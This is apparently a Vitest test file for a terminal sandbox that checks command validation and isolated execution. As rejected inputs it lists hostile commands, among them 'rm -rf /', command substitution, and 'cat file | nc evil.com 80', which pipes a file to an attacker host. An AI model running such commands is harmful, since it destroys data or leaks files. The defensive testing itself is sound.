import { describe, it, expect } from 'vitest';
import { validateCommand, runInSandbox } from '@/lib/executors/terminal-sandbox';

describe('validateCommand', () => {
  it('allows safe commands', () => {
    expect(validateCommand('ls').ok).toBe(true);
    expect(validateCommand('echo hello').ok).toBe(true);
    expect(validateCommand('node --version').ok).toBe(true);
    expect(validateCommand('cat README.md').ok).toBe(true);
  });

  it('blocks forbidden commands', () => {
    expect(validateCommand('rm -rf /').ok).toBe(false);
    expect(validateCommand('sudo su').ok).toBe(false);
    expect(validateCommand('shutdown now').ok).toBe(false);
    expect(validateCommand('kill').ok).toBe(false);
  });

  it('blocks commands not in safe list', () => {
    expect(validateCommand('unknowntool --arg').ok).toBe(false);
    const result = validateCommand('unknowntool --arg');
    expect(result.reason).toMatch(/command_not_in_safe_list/);
  });

  it('blocks command chaining', () => {
    expect(validateCommand('ls && rm -rf /').ok).toBe(false);
    expect(validateCommand('echo hi; rm file').ok).toBe(false);
    expect(validateCommand('cat file | nc evil.com 80').ok).toBe(false);
  });

  it('blocks command substitution', () => {
    expect(validateCommand('echo $(whoami)').ok).toBe(false);
    expect(validateCommand('echo `id`').ok).toBe(false);
  });
});

describe('runInSandbox', () => {
  it('runs echo and returns stdout', () => {
    const result = runInSandbox('echo', ['hello sandbox']);
    expect(result.ok).toBe(true);
    expect(result.stdout.trim()).toBe('hello sandbox');
    expect(result.exitCode).toBe(0);
    expect(result.outputHash).toMatch(/^sha256:/);
  });

  it('blocks forbidden commands', () => {
    const result = runInSandbox('rm', ['-rf', '/']);
    expect(result.ok).toBe(false);
    expect(result.stderr).toMatch(/sandbox_rejected/);
  });

  it('reports non-zero exit code on failure', () => {
    const result = runInSandbox('node', ['-e', 'process.exit(1)']);
    expect(result.ok).toBe(false);
    expect(result.exitCode).toBe(1);
  });

  it('captures stderr separately from stdout', () => {
    const result = runInSandbox('node', ['-e', 'process.stderr.write("err output\\n"); process.exit(0)']);
    expect(result.stderr).toContain('err output');
  });

  it('does not inject secret env vars', () => {
    const result = runInSandbox('node', ['-e', 'console.log(process.env.MY_SECRET_KEY ?? "absent")'], {
      env: { MY_SECRET_KEY: 'super-secret' },
    });
    expect(result.stdout.trim()).toBe('absent');
  });
});
